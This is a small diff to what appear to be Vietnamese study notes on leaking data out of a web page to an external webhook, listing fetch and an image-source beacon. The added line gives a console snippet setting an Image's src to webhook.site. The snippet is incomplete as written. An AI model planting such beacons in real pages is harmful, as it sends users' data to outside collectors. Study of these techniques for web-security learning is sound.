@@ -17,4 +17,4 @@
 #### Dùng webhook để gọi ra ngoài api
 # Cách để leak data ra bên ngoài
 #### Cách 1: dùng chính fetch
-#### Cách 2: tạo ra 1 tấm ảnh để cái nguồn (source) nó là url webhook
+#### Cách 2: tạo ra 1 tấm ảnh để cái nguồn (source) nó là url webhook  làm trong console " anh = new Image() anh.src = `webhook.site` "
